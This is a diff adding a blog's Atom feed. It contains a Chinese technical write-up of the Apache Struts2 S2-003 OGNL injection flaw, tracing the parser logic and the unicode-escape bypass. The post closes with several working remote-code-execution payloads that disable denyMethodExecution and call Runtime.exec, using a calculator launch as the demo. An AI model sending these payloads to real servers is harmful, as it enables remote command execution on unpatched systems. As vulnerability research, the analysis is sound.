@@ -1,0 +1,154 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://Ki1ro0133.github.io</id>
+    <title>Ki1ro&apos;s Blog</title>
+    <updated>2024-12-25T18:45:10.140Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://Ki1ro0133.github.io"/>
+    <link rel="self" href="https://Ki1ro0133.github.io/atom.xml"/>
+    <subtitle>温故而知新</subtitle>
+    <logo>https://Ki1ro0133.github.io/images/avatar.png</logo>
+    <icon>https://Ki1ro0133.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2024, Ki1ro&apos;s Blog</rights>
+    <entry>
+        <title type="html"><![CDATA[Apache Struts2 S2-003]]></title>
+        <id>https://Ki1ro0133.github.io/post/apache-struts2-s2-003/</id>
+        <link href="https://Ki1ro0133.github.io/post/apache-struts2-s2-003/">
+        </link>
+        <updated>2024-12-25T18:16:29.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="struts2-003">Struts2-003</h1>
+<h2 id="参考文章">参考文章</h2>
+<p><a href="https://su18.org/post/struts2-1/#s2-003">s2-003-su18</a></p>
+<p><a href="https://xz.aliyun.com/t/111">浅析OGNL表达式求值（S2003/005/009跟踪调试记录）</a></p>
+<h2 id="漏洞影响版本">漏洞影响版本</h2>
+<pre><code>Struts 2.0.0 - Struts 2.1.8.1
+</code></pre>
+<h2 id="漏洞描述">漏洞描述</h2>
+<p>在拦截器 ParametersInterceptor 调用 <code>setParameters()</code> 装载参数时，会使用<code>stack.setValue()</code> 最终调用 <code>OgnlUtil.setValue()</code> 方法来使用 OGNL 表达式解析参数名，造成漏洞。</p>
+<h2 id="流程分析">流程分析</h2>
+<p>在之前梳理逻辑过程中提到过，程序会调用设置的拦截器栈来执行相关命令，其中一个拦截器是 ParametersInterceptor，这个拦截器会解析参数，将参数放入 OgnlValueStack root 中的 action 中，也同时将参数调用 set 方法写入要执行的 Action 类中。</p>
+<p>在拦截器的 <code>doIntercept()</code> 方法中，初始化的过程中将 <code>DENY_METHOD_EXECUTION</code> 设置为 true。</p>
+<figure data-type="image" tabindex="1"><img src="/images/Struts2-003.assets/image-20241224151318651.png" alt="image-20241224151318651" loading="lazy"></figure>
+<p>然后调用 <code>setParameters()</code> 方法，循环参数 Map，首先调用 <code>this.acceptableName(name)</code> 来校验参数名是否非法，在较低版本中是判断是否包含 <code>#,=:</code></p>
+<figure data-type="image" tabindex="2"><img src="/images/Struts2-003.assets/image-20241224151433549.png" alt="image-20241224151433549" loading="lazy"></figure>
+<p>在高一点的版本中是使用正则来匹配</p>
+<figure data-type="image" tabindex="3"><img src="/images/Struts2-003.assets/1618881030286.png" alt="img" loading="lazy"></figure>
+<p>如果校验通过则调用 <code>stack.setValue(name, value)</code> 方法，这个方法会将待解析的表达式以 “conversion.property.fullName” 的值放在 context 里，然后调用 <code>OgnlUtil.setValue()</code> 方法。</p>
+<p>中间有个 <code>compile()</code> 方法会先调用 <code>ognl.Ognl#parseExpression</code> 方法，这个方法创建了一个 OgnlParser 对象，并调用其 <code>topLevelExpression()</code> 方法解析给定的 OGNL 表达式，并返回可由 OGNL 静态方法使用的表达式的树表示形式（Node）。</p>
+<p>在 OGNL 中，有一些不同类型的语法树，这些在在解析表达式的过程中，根据表达式的不同将会使用不同的构造树来进行处理，比如如果表达式为 <code>user.name</code>，就会生成 ASTChain，因为采用了链式结构来访问 user 对象中的 name 属性。</p>
+<figure data-type="image" tabindex="4"><img src="/images/Struts2-003.assets/image-20241224151706684.png" alt="image-20241224151706684" loading="lazy"></figure>
+<p>这些树都是 SimpleNode 的子类中，且各子类都根据自己的特性需求对父类的部分方法进行了重写，这些特性可能导致表达式最终执行结果受到影响。这些树对应的表现形式以及重写的方法可以参考 <a href="https://xz.aliyun.com/t/111">这篇文章</a>。</p>
+<p>而本次漏洞触发形式就在于 <code>(one)(two)</code> 这种表达形式，属于 <code>ASTEval</code> 类型。</p>
+<figure data-type="image" tabindex="5"><img src="/images/Struts2-003.assets/image-20241224151956980.png" alt="image-20241224151956980" loading="lazy"></figure>
+<p>看一下解析执行流程：</p>
+<ol>
+<li>取第一个节点，也就是 one，调用其 <code>getValue()</code> 方法计算其值，放入 expr 中；</li>
+<li>取第二个节点，也就是 two，赋值给 source ；</li>
+<li>判断 expr 是否为 node 类型，如果不是，则调用 <code>Ognl.parseExpression()</code> 尝试进行解析，解析的结果强转为 node 类型；</li>
+<li>将 source 放入 root 中，调用 node 的 <code>getValue()</code> 方法对其进行解析；</li>
+<li>还原之前的 root。</li>
+</ol>
+<p>因此我们得知：使用 <code>(one)(two)</code> 这种表达式执行时，将会计算 one ，two，并将 two 作为 root 再次为 one 的结果进行计算。如果 one 的结果是一个 AST，OGNL 将简单的执行解释它，否则 OGNL 将这个对象转换为字符串形式然后解析这个字符串。</p>
+<p>所以，比如使用 Runtime 弹计算器，原本的表达式可以这样写：</p>
+<pre><code class="language-java">@java.lang.Runtime@getRuntime().exec('open -a Calculator.app')
+</code></pre>
+<p>但是使用 <code>(one)(two)</code> 可以改成这样：</p>
+<pre><code class="language-java">('@java.lang.Runtime'+'@getRuntime().exec(\'open -a Calculator.app\')')('Ki1ro')
+('@java.lang.Runtime@'+'getRuntime().exec(#Ki1ro)')(#Ki1ro='open -a Calculator.app')
+</code></pre>
+<p>将 one 用字符串括起来，甚至是进行拼接，后面再跟一个括号，这样程序就会对 one 进行二次解析，第一次解析成为字符串，第二次解析成为对应的 AST 并执行，也可以将其中的部分变量拆分到 two 中，因为 two 会作为 one 的 root 解析执行，可以拿到其中的值。</p>
+<p>又由于表达式的执行是由右向左执行的，因此向右面写入更多个括号，都会依次拆分，最后执行到 one 表达式中：</p>
+<pre><code class="language-java">('@java.lang.Runtime'+'@getRuntime().exec(\'open -a Calculator.app\')')('Ki1ro1')('Ki1ro2')('Ki1ro3')('Ki1ro4')('Ki1ro5')('Ki1ro6')
+</code></pre>
+<p>或者向左叠入更多层级的括号：</p>
+<pre><code class="language-java">('Ki1ro6')(('Ki1ro5')(('Ki1ro4')(('Ki1ro3')(('Ki1ro2')(('@java.lang.Runtime'+'@getRuntime().exec(\'open -a Calculator.app\')')('Ki1ro1'))))))
+</code></pre>
+<p>这些写法都不影响最终 one 表达式的执行，如均可以成功弹出计算器。</p>
+<p>以上是使用<code>Ognl.parseExpression()</code> 加 <code>Ognl.getValue()</code> 来执行的，与 <code>OgnlUtil.getValue()</code> 一致。</p>
+<p>那使用 <code>OgnlUtil.setValue()</code>，调用会一致吗？答案是否定的。</p>
+<figure data-type="image" tabindex="6"><img src="/images/Struts2-003.assets/image-20241224153406775.png" alt="image-20241224153406775" loading="lazy"></figure>
+<p>跟进分析下<code>Ognl.setValue</code>，看看哪里的出现了问题。</p>
+<p><code>OgnlUtil.setValue()</code> 的调用链为：<code>OgnlUtil.setValue()</code> -&gt;  <code>OgnlUtils.compile()</code> -&gt; <code>Ognl.setValue()</code> -&gt;  <code>Node.setValue()</code> -&gt; <code>SimpleNode.evaluateSetValueBody()</code> -&gt; <code>ASTEval.setValueBody()</code>。</p>
+<p><code>ASTEval.setValueBody()</code> 与 <code>ASTEval.getValueBody()</code> 类似，都是</p>
+<ol>
+<li>取第一个节点，也就是 one，调用其  <code>getValue()</code>  方法计算其值，放入 expr 中；</li>
+<li>取第二个节点，也就是 two，赋值给 source ；</li>
+<li>判断 expr 是否为 node 类型，如果不是，则调用 <code>Ognl.parseExpression()</code> 尝试进行解析，解析的结果强转为 node 类型；</li>
+<li>将 source 放入 root 中，调用 node 的 <code>setValue()</code> 方法对其进行解析；</li>
+<li>还原之前的 root。</li>
+</ol>
+<p>在第4步中出现了分歧，<code>ASTEval.setValueBody()</code>调用的是<code>setValue()</code>。</p>
+<figure data-type="image" tabindex="7"><img src="/images/Struts2-003.assets/image-20241224155941877.png" alt="image-20241224155941877" loading="lazy"></figure>
+<p>接着会再次调用 <code>SimpleNode.evaluateSetValueBody()</code> -&gt; <code>ASTChain.setValueBody</code> 。</p>
+<figure data-type="image" tabindex="8"><img src="/images/Struts2-003.assets/image-20241224160239260.png" alt="image-20241224160239260" loading="lazy"></figure>
+<figure data-type="image" tabindex="9"><img src="/images/Struts2-003.assets/image-20241224160817861.png" alt="image-20241224160817861" loading="lazy"></figure>
+<p><code>ASTChian.setValueBody()</code> 和 <code>ASTChian.getValueBody()</code> 主要的区别是 <code>ASTChian.setValueBody()</code> 只循环到倒数第二个节点即 <code>children.length - 2</code> ，而 <code>ASTChian.getValueBody()</code> 则循环到最后一个节点即 <code>children.length - 1</code> 。</p>
+<p>造成这个不同的原因主要是两个方法的功能点不同：  <code>setValueBody</code>  中使用  <code>children.length - 2</code>  是因为它需要处理最后一个子节点的值设置操作，而  <code>getValueBody</code>  中使用  <code>children.length - 1</code>  是因为它需要处理所有子节点的值获取操作。</p>
+<figure data-type="image" tabindex="10"><img src="/images/Struts2-003.assets/image-20241224161813396.png" alt="image-20241224161813396" loading="lazy"></figure>
+<figure data-type="image" tabindex="11"><img src="/images/Struts2-003.assets/image-20241224161727794.png" alt="image-20241224161727794" loading="lazy"></figure>
+<p><code>ASTChian.setValueBody()</code> 遍历完后，会调用最后一个子节点的 <code>setValue</code> 方法。</p>
+<figure data-type="image" tabindex="12"><img src="/images/Struts2-003.assets/image-20241224162417885.png" alt="image-20241224162417885" loading="lazy"></figure>
+<p>我传入的OGNL表达式为 <code>('@java.lang.Runtime'+'@getRuntime().exec(\'open -a Calculator.app\')')('Ki1ro')</code> ，所以最后一个子节点为 <code>exec(&quot;open -a Calculator&quot;)</code> ，其AST构造树为 <code>ASTStaticMethod</code> 。</p>
+<figure data-type="image" tabindex="13"><img src="/images/Struts2-003.assets/image-20241224162732046.png" alt="image-20241224162732046" loading="lazy"></figure>
+<p>之后会调用 <code>SimpleNode.evaluateSetValueBody()</code> ，接着调用 <code>setValueBody()</code> ， <code>ASTStaticMethod</code> 并没有重写 <code>setValueBody()</code> ，从而会调用 <code>SimpleNode.setValueBody</code> 从而触发报错。</p>
+<figure data-type="image" tabindex="14"><img src="/images/Struts2-003.assets/image-20241224163525207.png" alt="image-20241224163525207" loading="lazy"></figure>
+<p>对于 <code>Ognl.setValue</code> 解析的问题，网上主要是通过增加 ASTEval 的子节点来解决。</p>
+<p>这里提出了另外一种方法，增加 ASTChain 的子节点，使得要执行的方法在 <code>ASTChian.setValueBody()</code> 的循环中能够执行。</p>
+<p>例如下面的 Payload：</p>
+<pre><code class="language-java">('@java.lang.Runtime'+'@getRuntime().exec(\'open -a Calculator.app\').Ki1ro')('Ki1ro')
+</code></pre>
+<p>跟原来的 Payload 相比，在 <code>exec</code> 后又增加了一个链式结构，使得解析的 ASTChain 的子节点增多，让 <code>exec</code> 能够在循环中提早进行调用。</p>
+<figure data-type="image" tabindex="15"><img src="/images/Struts2-003.assets/image-20241224164438914.png" alt="image-20241224164438914" loading="lazy"></figure>
+<p>如下图的测试结果，可以成功弹出计算器。</p>
+<figure data-type="image" tabindex="16"><img src="/images/Struts2-003.assets/image-20241224164641810.png" alt="image-20241224164641810" loading="lazy"></figure>
+<blockquote>
+<p>但要注意的一点是，这个方法只适用于ASTChain，其他的语法树不一定适用，所以通解依然是第二种方法。</p>
+</blockquote>
+<p>第二种网上主要的方法是利用在第一次 <code>ASTEval.setValueBody()</code> 中，在调取两个子节点时，总是需要调用 <code>getValue</code> 。</p>
+<p>通过增加 ASTEval 中的子节点数量，让 <code>children[0]</code> 为我们原本的Payload。</p>
+<figure data-type="image" tabindex="17"><img src="/images/Struts2-003.assets/image-20241224165302392.png" alt="image-20241224165302392" loading="lazy"></figure>
+<p>例如如下的一些Payload：</p>
+<pre><code class="language-java">('@java.lang.Runtime'+'@getRuntime().exec(\'open -a Calculator.app\')')('Ki1ro')('Ki1ro')
+
+('@java.lang.Runtime'+'@getRuntime().exec(#aa)')(#aa='open -a Calculator.app')('Ki1ro')
+</code></pre>
+<p>以第一个 Payload 来具体说明，当第一次执行 <code>ASTEval.setValueBody()</code> 时， <code>children[0]</code> 从原来的 <code>(&quot;@java.lang.Runtime&quot; + &quot;@getRuntime().exec(\'open -a Calculator.app\')&quot;)</code>  变为了 <code>((&quot;@java.lang.Runtime&quot; + &quot;@getRuntime().exec(\'open -a Calculator.app\')&quot;))(&quot;Ki1ro&quot;)</code> 。</p>
+<p>相等于原 Payload 从 <code>children[0].getValue()</code> 开始解析执行。</p>
+<figure data-type="image" tabindex="18"><img src="/images/Struts2-003.assets/image-20241224170050921.png" alt="image-20241224170050921" loading="lazy"></figure>
+<p>如下图的测试结果，也可以成功弹出计算器。</p>
+<figure data-type="image" tabindex="19"><img src="/images/Struts2-003.assets/image-20241224170516758.png" alt="image-20241224170516758" loading="lazy"></figure>
+<p>上面讨论了调用静态方法的表达式，那如果想要修改 context 里的值呢？根据官方文档的描述和测试的结果，以下的方式都可以：</p>
+<pre><code class="language-java">('#context[\'key\']=aaaa')('Ki1ro')
+('#context[\'key\']')('Ki1ro')=aaa
+('#context[\'key\']=#a')(#a='aaa')
+</code></pre>
+<p>还有关键的一点是：在对表达式进行解析时，由于在 <code>OgnlParserTokenManager</code> 方法中使用了 <code>ognl.JavaCharStream#readChar()</code> 方法，在读到 <code>\\u</code> 的情况下，会继续读入 4 个字符，并将它们转换为 char，因此 OGNL 表达式实际上支持了 unicode 编码，这就绕过了之前正则或者字符串判断的限制。</p>
+<figure data-type="image" tabindex="20"><img src="/images/Struts2-003.assets/image-20241224213004822.png" alt="image-20241224213004822" loading="lazy"></figure>
+<p>在解析完表达式执行方法的时候，会调用 <code>XWorkMethodAccessor#callMethod/callStaticMethod</code> 方法，在调用之前会在 context 中取 <code>xwork.MethodAccessor.denyMethodExecution</code> 的值转为布尔型进行判断，如果是 true 则不会调用方法，只有为 false 才会进行调用。</p>
+<p>默认的OGNL调用方法时，获取的是 <code>ObjectMethodAccessor</code>  ，而在struts2下获取的是 <code>XWorkMethodAccessor</code> ，  <code>XWorkMethodAccessor</code> 重写了 <code>callMethod</code> 和 <code>callStaticMethod</code>，调用前会先查看是否禁用的方法调用。</p>
+<figure data-type="image" tabindex="21"><img src="/images/Struts2-003.assets/image-20241224222243203.png" alt="image-20241224222243203" loading="lazy"></figure>
+<figure data-type="image" tabindex="22"><img src="/images/Struts2-003.assets/image-20241224224024839.png" alt="image-20241224224024839" loading="lazy"></figure>
+<p>因此，这个漏洞的触发流程就明确了，攻击者在参数名处传入恶意表达式：</p>
+<ul>
+<li>使用 unicode 编码特殊字符绕过对关键字符黑名单的判断；</li>
+<li>将 context 中的 <code>xwork.MethodAccessor.denyMethodExecution</code> 值修改为 false，这样在后面才可以调用方法；</li>
+<li>执行恶意的表达式。</li>
+</ul>
+<p>因此 S2-003 的漏洞利用 payload 为：</p>
+<pre><code class="language-java">(ki1ro1)(('%5Cu0023context%5B%5C'xwork.MethodAccessor.denyMethodExecution%5C'%5D%5Cu003d%5Cu0023ki1ro2')(%5Cu0023ki1ro2%5Cu003dnew%5Cu0020java.lang.Boolean(false)))&amp;(ki1ro3)(('%5Cu0023ki1ro4.exec(%5C'open%20-a%20Calculator.app%5C')')(%5Cu0023ki1ro4%5Cu003d@java.lang.Runtime@getRuntime()))
+</code></pre>
+<pre><code class="language-java">(%27%5Cu0023context%5B%5C'xwork.MethodAccessor.denyMethodExecution%5C'%5D%5Cu003dfalse')(abc)(def)&amp;('%5Cu0040java.lang.Runtime%40'%2B'getRuntime().exec(%5Cu0023aa)')(%5Cu0023aa%5Cu003d'open%5Cu0020-a%5Cu0020Calculator.app')('ki1ro')
+</code></pre>
+<pre><code class="language-java">('%5Cu0023context%5B%5C'xwork.MethodAccessor.denyMethodExecution%5C'%5D%5Cu003dfalse')('aa')('bb')&amp;('%5Cu0023ki1ro%5Cu003d@java.lang.Runtime@getRuntime().exec(%5C'open%20-a%20Calculator.app%5C')')('ki1ro')('cc')
+</code></pre>
+<p>当然也可以根据上面的分析随意改成自己喜欢的样子。这里有一点要注意的是，可以看到第二个 payload 没有直接使用 @ 调用静态方法的方式，而是使用了 <code>#ki1ro=</code> 进行了赋值，这是因为在 OGNL 对参数解析时，静态方法的解析会排在其他方式的前面，这就导致了还没修改 context 里的值，导致无法执行，所以先进行了赋值。主要的原因是 <code>TreeMap</code> 的默认排序是按照 key 的字典顺序排序即升序。</p>
+<h2 id="payload">Payload</h2>
+<pre><code class="language-java">(ki1ro1)(('%5Cu0023context%5B%5C'xwork.MethodAccessor.denyMethodExecution%5C'%5D%5Cu003d%5Cu0023ki1ro2')(%5Cu0023ki1ro2%5Cu003dnew%5Cu0020java.lang.Boolean(false)))&amp;(ki1ro3)(('%5Cu0023ki1ro4.exec(%5C'open%20-a%20Calculator.app%5C')')(%5Cu0023ki1ro4%5Cu003d@java.lang.Runtime@getRuntime()))
+</code></pre>
+<pre><code class="language-java">(%27%5Cu0023context%5B%5C'xwork.MethodAccessor.denyMethodExecution%5C'%5D%5Cu003dfalse')(abc)(def)&amp;('%5Cu0040java.lang.Runtime%40'%2B'getRuntime().exec(%5Cu0023aa)')(%5Cu0023aa%5Cu003d'open%5Cu0020-a%5Cu0020Calculator.app')('ki1ro')
+</code></pre>
+<pre><code class="language-java">('%5Cu0023context%5B%5C'xwork.MethodAccessor.denyMethodExecution%5C'%5D%5Cu003dfalse')('aa')('bb')&amp;('%5Cu0023ki1ro%5Cu003d@java.lang.Runtime@getRuntime().exec(%5C'open%20-a%20Calculator.app%5C')')('ki1ro')('cc')
+</code></pre>
+]]></content>
+    </entry>
+</feed>
